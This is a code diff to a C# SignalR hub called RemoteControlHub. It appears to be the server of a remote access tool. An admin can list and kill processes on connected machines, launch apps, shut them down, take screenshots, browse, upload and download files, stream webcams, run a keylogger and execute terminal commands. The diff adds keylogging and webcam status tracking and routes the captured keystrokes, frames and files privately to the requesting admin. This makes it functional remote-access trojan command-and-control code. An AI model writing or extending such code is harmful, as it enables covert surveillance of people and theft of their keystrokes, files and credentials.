@@ -7,6 +7,9 @@ namespace WebApp.Hubs
     {
         public string MachineName { get; set; } = "";
         public DateTime LastHeartbeat { get; set; }
+        public bool IsKeylogging { get; set; } = false;
+        public bool IsWebcamStreaming { get; set; } = false;
+        // Add more as needed: IsTerminalRunning, etc.
     }
 
     public class RemoteControlHub : Hub
@@ -23,6 +26,10 @@ namespace WebApp.Hubs
         {
             if (ConnectedAgents.TryRemove(Context.ConnectionId, out var info))
             {
+                // Reset statuses on disconnect
+                info.IsKeylogging = false;
+                info.IsWebcamStreaming = false;
+                // Add more resets as needed
                 Clients.All.SendAsync("AgentDisconnected", Context.ConnectionId, info.MachineName);
             }
             return base.OnDisconnectedAsync(exception);
@@ -58,25 +65,50 @@ namespace WebApp.Hubs
             var threshold = DateTime.UtcNow.AddSeconds(-65);
             var agentsList = ConnectedAgents
                 .Where(x => x.Value.LastHeartbeat >= threshold)
-                .Select(x => new { id = x.Key, name = x.Value.MachineName })
+                .Select(x => new { 
+                    id = x.Key, 
+                    name = x.Value.MachineName,
+                    status = GetAgentStatus(x.Value)
+                })
                 .ToList();
             var json = System.Text.Json.JsonSerializer.Serialize(agentsList);
             await Clients.Caller.SendAsync("ReceiveConnectedAgents", json);
         }
 
+        private string GetAgentStatus(AgentInfo info)
+        {
+            var statuses = new List<string>();
+            if (info.IsKeylogging) statuses.Add("Keylogging");
+            if (info.IsWebcamStreaming) statuses.Add("Webcam");
+            // Add more: if (info.IsTerminalRunning) statuses.Add("Terminal");
+            return statuses.Any() ? string.Join(", ", statuses) : "Connected";
+        }
+
+        private async Task BroadcastAgentStatusUpdate(string agentId)
+        {
+            if (ConnectedAgents.TryGetValue(agentId, out var info))
+            {
+                var status = GetAgentStatus(info);
+                await Clients.All.SendAsync("AgentStatusUpdate", agentId, status);
+            }
+        }
+
         // Admin calls this to request processes from an Agent
         public async Task RequestProcesses(string targetConnectionId)
         {
-            await Clients.Client(targetConnectionId).SendAsync("GetProcessesCommand");
+            var adminId = Context.ConnectionId;
+            await Clients.Client(targetConnectionId).SendAsync("GetProcessesCommand", adminId);
         }
 
         // Agent responds with the process list back to Hub
         // DTO object: List<dynamic> or JSON string
         public async Task SendProcessesResult(string adminConnectionId, string processesJson)
         {
-            // We just broadcast it to the requester (Admin)
-            // If adminConnectionId is empty, broadcast to all.
-            await Clients.All.SendAsync("ReceiveProcesses", Context.ConnectionId, processesJson);
+            // Send directly to the requesting admin instead of broadcasting
+            if (!string.IsNullOrEmpty(adminConnectionId))
+            {
+                await Clients.Client(adminConnectionId).SendAsync("ReceiveProcesses", Context.ConnectionId, processesJson);
+            }
         }
 
         // Admin calls this to Kill a process on a specific Agent
@@ -85,15 +117,19 @@ namespace WebApp.Hubs
             await Clients.Client(targetConnectionId).SendAsync("KillProcessCommand", processId);
         }
 
-        // --- NEW: Applications Management ---
+        // Applications Management
         public async Task RequestApplications(string targetConnectionId)
         {
-            await Clients.Client(targetConnectionId).SendAsync("GetApplicationsCommand");
+            var adminId = Context.ConnectionId;
+            await Clients.Client(targetConnectionId).SendAsync("GetApplicationsCommand", adminId);
         }
 
         public async Task SendApplicationsResult(string adminConnectionId, string appsJson)
         {
-            await Clients.All.SendAsync("ReceiveApplications", Context.ConnectionId, appsJson);
+            if (!string.IsNullOrEmpty(adminConnectionId))
+            {
+                await Clients.Client(adminConnectionId).SendAsync("ReceiveApplications", Context.ConnectionId, appsJson);
+            }
         }
 
         public async Task StartApplication(string targetConnectionId, string appPath)
@@ -101,7 +137,7 @@ namespace WebApp.Hubs
             await Clients.Client(targetConnectionId).SendAsync("StartAppCommand", appPath);
         }
 
-        // --- NEW: Power Management ---
+        // Power Management
         public async Task ShutdownDevice(string targetConnectionId)
         {
             await Clients.Client(targetConnectionId).SendAsync("ShutdownCommand");
@@ -112,32 +148,49 @@ namespace WebApp.Hubs
             await Clients.Client(targetConnectionId).SendAsync("RestartCommand");
         }
 
-        // --- NEW: Screen Capture ---
+        // Screen Capture
         public async Task RequestScreenshot(string targetConnectionId)
         {
-            await Clients.Client(targetConnectionId).SendAsync("TakeScreenshotCommand");
+            var adminId = Context.ConnectionId;
+            await Clients.Client(targetConnectionId).SendAsync("TakeScreenshotCommand", adminId);
         }
 
         // Agent responds with the Base64 image
         public async Task SendScreenshotResult(string adminConnectionId, string base64Image)
         {
-            await Clients.All.SendAsync("ReceiveScreenshot", Context.ConnectionId, base64Image);
+            if (!string.IsNullOrEmpty(adminConnectionId))
+            {
+                await Clients.Client(adminConnectionId).SendAsync("ReceiveScreenshot", Context.ConnectionId, base64Image);
+            }
         }
 
-        // --- NEW: File Manager ---
+        // File Manager
         public async Task RequestDirectoryContents(string targetConnectionId, string path)
         {
-            await Clients.Client(targetConnectionId).SendAsync("GetDirectoryContentsCommand", path);
+            var adminId = Context.ConnectionId;
+            await Clients.Client(targetConnectionId).SendAsync("GetDirectoryContentsCommand", adminId, path);
         }
 
         public async Task SendDirectoryContentsResult(string adminConnectionId, string path, string json)
         {
-            await Clients.All.SendAsync("ReceiveDirectoryContents", Context.ConnectionId, path, json);
+            if (!string.IsNullOrEmpty(adminConnectionId))
+            {
+                await Clients.Client(adminConnectionId).SendAsync("ReceiveDirectoryContents", Context.ConnectionId, path, json);
+            }
         }
 
         public async Task RequestFileDownload(string targetConnectionId, string filePath)
         {
-            await Clients.Client(targetConnectionId).SendAsync("DownloadFileCommand", filePath);
+            var adminId = Context.ConnectionId;
+            await Clients.Client(targetConnectionId).SendAsync("DownloadFileCommand", adminId, filePath);
+        }
+
+        public async Task SendFileResult(string adminConnectionId, string fileName, string base64Data)
+        {
+            if (!string.IsNullOrEmpty(adminConnectionId))
+            {
+                await Clients.Client(adminConnectionId).SendAsync("ReceiveFile", Context.ConnectionId, fileName, base64Data);
+            }
         }
 
         public async Task UploadFileToAgent(string targetConnectionId, string dirPath, string fileName, string base64Data)
@@ -145,64 +198,95 @@ namespace WebApp.Hubs
             await Clients.Client(targetConnectionId).SendAsync("ReceiveFileUploadCommand", dirPath, fileName, base64Data);
         }
 
-        public async Task SendFileResult(string adminConnectionId, string fileName, string base64Data)
-        {
-            await Clients.All.SendAsync("ReceiveFile", Context.ConnectionId, fileName, base64Data);
-        }
-
-        // --- NEW: Webcam Stream ---
+        // Webcam Stream
         public async Task RequestWebcams(string targetConnectionId)
         {
-            await Clients.Client(targetConnectionId).SendAsync("GetWebcamsCommand");
+            var adminId = Context.ConnectionId;
+            await Clients.Client(targetConnectionId).SendAsync("GetWebcamsCommand", adminId);
         }
 
         public async Task SendWebcamsResult(string adminConnectionId, string webcamsJson)
         {
-            await Clients.All.SendAsync("ReceiveWebcams", Context.ConnectionId, webcamsJson);
+            if (!string.IsNullOrEmpty(adminConnectionId))
+            {
+                await Clients.Client(adminConnectionId).SendAsync("ReceiveWebcams", Context.ConnectionId, webcamsJson);
+            }
         }
 
         public async Task RequestStartWebcam(string targetConnectionId, string cameraMoniker = "")
         {
-            await Clients.Client(targetConnectionId).SendAsync("StartWebcamCommand", cameraMoniker ?? "");
+            if (ConnectedAgents.TryGetValue(targetConnectionId, out var info))
+            {
+                info.IsWebcamStreaming = true;
+                await BroadcastAgentStatusUpdate(targetConnectionId);
+            }
+            var adminId = Context.ConnectionId;
+            await Clients.Client(targetConnectionId).SendAsync("StartWebcamCommand", adminId, cameraMoniker ?? "");
         }
 
         public async Task RequestStopWebcam(string targetConnectionId)
         {
-            await Clients.Client(targetConnectionId).SendAsync("StopWebcamCommand");
+            if (ConnectedAgents.TryGetValue(targetConnectionId, out var info))
+            {
+                info.IsWebcamStreaming = false;
+                await BroadcastAgentStatusUpdate(targetConnectionId);
+            }
+            var adminId = Context.ConnectionId;
+            await Clients.Client(targetConnectionId).SendAsync("StopWebcamCommand", adminId);
         }
 
         public async Task SendWebcamFrame(string adminConnectionId, string base64Image)
         {
-            await Clients.All.SendAsync("ReceiveWebcamFrame", Context.ConnectionId, base64Image);
+            if (!string.IsNullOrEmpty(adminConnectionId))
+            {
+                await Clients.Client(adminConnectionId).SendAsync("ReceiveWebcamFrame", Context.ConnectionId, base64Image);
+            }
         }
 
-        // --- NEW: Keylogger ---
+        // Keylogger
         public async Task RequestStartKeylogger(string targetConnectionId)
         {
-            await Clients.Client(targetConnectionId).SendAsync("StartKeyloggerCommand");
+            if (ConnectedAgents.TryGetValue(targetConnectionId, out var info))
+            {
+                info.IsKeylogging = true;
+                await BroadcastAgentStatusUpdate(targetConnectionId);
+            }
+            var adminId = Context.ConnectionId;
+            await Clients.Client(targetConnectionId).SendAsync("StartKeyloggerCommand", adminId);
         }
 
         public async Task RequestStopKeylogger(string targetConnectionId)
         {
-            await Clients.Client(targetConnectionId).SendAsync("StopKeyloggerCommand");
+            if (ConnectedAgents.TryGetValue(targetConnectionId, out var info))
+            {
+                info.IsKeylogging = false;
+                await BroadcastAgentStatusUpdate(targetConnectionId);
+            }
+            var adminId = Context.ConnectionId;
+            await Clients.Client(targetConnectionId).SendAsync("StopKeyloggerCommand", adminId);
         }
 
-        public async Task SendKeylogData(string targetConnectionId, string keys)
+        public async Task SendKeylogData(string adminConnectionId, string keys)
         {
-            // Here targetConnectionId is actually the Hub caller (Agent) passing its ID to broadcast to All
-            // Note: In a production app you'd map back to Admin, but broadcast is fine for MVP
-            await Clients.All.SendAsync("ReceiveKeylog", Context.ConnectionId, keys);
+            if (!string.IsNullOrEmpty(adminConnectionId))
+            {
+                await Clients.Client(adminConnectionId).SendAsync("ReceiveKeylog", Context.ConnectionId, keys);
+            }
         }
 
-        // --- NEW: Terminal ---
+        // Terminal
         public async Task RequestExecuteCommand(string targetConnectionId, string command)
         {
-            await Clients.Client(targetConnectionId).SendAsync("ExecuteTerminalCommand", command);
+            var adminId = Context.ConnectionId;
+            await Clients.Client(targetConnectionId).SendAsync("ExecuteTerminalCommand", adminId, command);
         }
 
         public async Task SendTerminalOutput(string adminConnectionId, string output)
         {
-            await Clients.All.SendAsync("ReceiveTerminalOutput", Context.ConnectionId, output);
+            if (!string.IsNullOrEmpty(adminConnectionId))
+            {
+                await Clients.Client(adminConnectionId).SendAsync("ReceiveTerminalOutput", Context.ConnectionId, output);
+            }
         }
     }
 }
